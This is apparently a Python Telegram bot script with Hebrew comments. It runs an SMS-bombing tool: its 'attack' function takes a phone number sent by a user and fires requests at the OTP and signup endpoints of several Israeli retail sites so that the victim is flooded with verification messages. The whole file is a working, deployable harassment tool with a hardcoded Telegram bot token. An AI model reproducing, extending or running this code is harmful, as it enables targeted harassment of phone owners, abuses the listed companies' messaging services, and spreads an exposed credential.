import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os

# --- 1. שרת Flask (חובה עבור Render) ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is running!"

def run():
    # Render נותן פורט אוטומטי, אנחנו מקשיבים לו
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- 2. הגדרת הבוט עם הטוקן החדש ---
API_TOKEN = '8788411826:AAG5BMCIL_iNCfgX8kM2f5BIzN6RZtd_C30'
bot = telebot.TeleBot(API_TOKEN)

def attack(target):
    # רשימת האתרים המעודכנת והמתוקנת
    apis = [
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "c8b24899-349b-4838-8303-d279d4e2fffd"}},
        {"n": "Footlocker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
        {"n": "Terminal X", "u": "https://www.terminalx.com/api/v1/auth/otp/send", "d": {"phone": target}},
        {"n": "Golf", "u": "https://www.golf-il.co.il/customer/ajax/post/", "d": {"form_key": "WaqdnLcdTj3jsiZw", "bot_validation": "1", "type": "login", "telephone": target}},
        {
            "n": "Flashy", 
            "u": "https://api.flashy.app/thunder/contact?overwrite=true&primary_key=email", 
            "d": {
                "email": f"user_{target}@gmail.com", 
                "phone": target, 
                "signup_source": "welcome"
            }
        }
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    for site in apis:
        try:
            # הפרדה בין גולף (form-data) לשאר (JSON)
            if site["n"] == "Golf":
                requests.post(site["u"], data=site["d"], headers=headers, timeout=10)
            else:
                requests.post(site["u"], json=site["d"], headers=headers, timeout=10)
            print(f"Sent to {site['n']}")
        except:
            pass
        time.sleep(1)

@bot.message_handler(func=lambda m: True)
def handle(m):
    target = m.text.strip()
    if target.isdigit() and len(target) >= 9:
        bot.reply_to(m, f"🚀 מתחיל תהליך עבור {target}...")
        attack(target)
        bot.send_message(m.chat.id, "✅ הסבב הסתיים.")
    else:
        bot.reply_to(m, "נא לשלוח מספר טלפון תקין.")

# --- 3. הרצה ---
if __name__ == "__main__":
    keep_alive() # מפעיל את השרת שמונע כיבוי ב-Render
    print("--- BOT IS READY ---")
    bot.infinity_polling()
